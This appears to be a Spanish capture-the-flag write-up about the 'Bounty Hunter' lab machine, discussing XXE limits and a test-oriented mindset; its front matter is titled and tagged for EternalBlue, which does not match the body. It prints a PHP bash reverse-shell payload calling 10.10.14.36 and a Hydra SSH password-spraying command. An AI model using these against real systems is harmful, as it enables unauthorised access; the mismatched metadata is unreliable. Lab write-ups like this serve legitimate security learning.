---
title: "Eternal Blue"
description: "How to identify Eternal Blue"
date: "2025-11-21"
banner:
  src: "../../images/eternal-blue.jpg"
  alt: "Ocean image"
  caption: 'Photo by <a href="https://unsplash.com/@tarafuco">Tanja Cotoaga</a> on Unsplash'
categories:
  - "KEV"
  - "EternalBlue"
  - "Windows 7"
  - "SMBv1"
keywords:
  - "KEV"
  - "EternalBlue"
  - "Windows 7"
  - "SMBv1"
---

# Que aprendi de la maquina Bounty Hunter

Me avalance sobre la maquina con una voracidad insana, mi cabeza se centro en una sola idea y la hoja mas pequenia del brote de una rama no me dejo ver el bosque...

## XXE

Segun sea nuestro nivel teorico el xxe inicial abre ideas, como XXE para inclusion de archivos como el passwd, RCE y una posterior reverse shell, un OOB...

Pero si profundizamos en estas ideas iniciales a nivel teorico vemos lo siguiente:

1. El parser XML solo trabaja a nivel texto, es simplemente una forma de acceder a datos, no de interpretarlos ni ejecutarlos.

2. Para lograr un RCE es necesaria una cadena de ataque, es decir, que un proceso o servicio posterior interprete una instruccion maliciosa nuestra de un modo tal que asi: `attckr -> XML Parser -> Svc_interprete`.
   1. Por ejemplo, el siguiente caso no lograra un Reverse Shell ya que no hay un interprete perse `XXE SSRF http://attckr/revshell.php   ->   attckr$ python -m http.server 80 <?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.36/4040 0>&1'")?>`
   2. El parser XML lee `revshell.php` pero no lo ejecuta por si mismo (per se), y al no haber tampoco una cadena en la cual el parser tras tomar este archivo lo pasa/inyecta en un segundo proceso/servicio que lo intereprete no es posible RCE to Reverse Shell.

> _*Pero porque el wrapper PHP es interepretado si dijimos que el Parser XML no interpreta codigo?*_ Porque el parser XML está dentro de una aplicación PHP, y utiliza funciones del sistema de archivos de PHP. Esto no es ejecución de código, es solo uso del sistema de archivos a través de los wrappers que PHP proporciona.

### XXE puro solo como Exfiltracion de Datos

1. El parser XML no interpreta/ejecuta código.
2. Solo resuelve entidades como texto.
3. Solo accede a recursos disponibles mediante rutas o wrappers (file://, php://, etc.).
4. El RCE surge por una mala configuración o diseño inseguro del parser.
5. El ataque ocurre porque el atacante puede definir entidades externas, gracias a esa mala configuración.


## Mindset: De Como explotar a Que testear

Segun mi propia opinion, es mas facil fracasar pensando "Como explotar" que pensando "Que testear". Penando como explotar a la victima sutilmente cerramos el horizonte de posibilidades, imaginamos una via de explotacion y nos centramos en ella. Si fracasamos en ella, nos encontramos con que tenemos que volver a cero, con todo lo que ello conlleva: perdida de tiempo, frustracion, el "y ahora que", y otra vez al mismo punto "como explotar a la victima" y volver a buscar una via de explotacion con las mismas posibles consecuencias.

En cambio, en mi opinion, si pensamos "Que probar", sutilmente, dejamos puertas abiertas a las que volver, no nos centramos en una via de explotacion sino que nos dejamos llevar por la profundidad de la superficie vulnerable. De este modo, es mas simple combinar posibilidades y nos mantenemos frescos, en movimiento, no hay que volver a atras si en algun punto nuestro test de la superficie falla, sino que "jugamos" o combinamos variantes o posibilidades.

De este modo, es mucho mas fluido penetrar esta maquina si, por un lado, analizamos un posible XXE y vemos que solo podemos exfiltrar datos, y por el otro, con un fuzzeo por extensiones utilizando la wordlist `common.txt` descubrimos un archivo expuesto de PHP que al interpretarse en el navegador no es visible, pero que podemos exfiltrar. 

En mi opinion, tener la mente fresca y estar abierto a posibilidades es fundamental para combinar vectores. Necesitamos combinar posibilidades para la primera intrusion. Por ejemplo, tenemos un XXE de exfiltracion de datos y unas credenciales. Otra posibilidad es leer el passwd para obtener usuarios con Bash y hacer un password sprying con Hydra al puerto 22, ya que es el unico accesso que logramos encontrar hasta el momento. Y asi logramos credenciales de accesso. Todo muy chill, muy zen, muy "respiremos hondo, seamos felices y disfrutemos de lo que hacemos".

Es una lista corta, pero nos damos el gusto de usar Hydra:

```sh
└─$ cat usernames.txt
root
development

hydra -L usernames.txt -p 'm19Ro...sq6K' 10.10.11.100 ssh
```
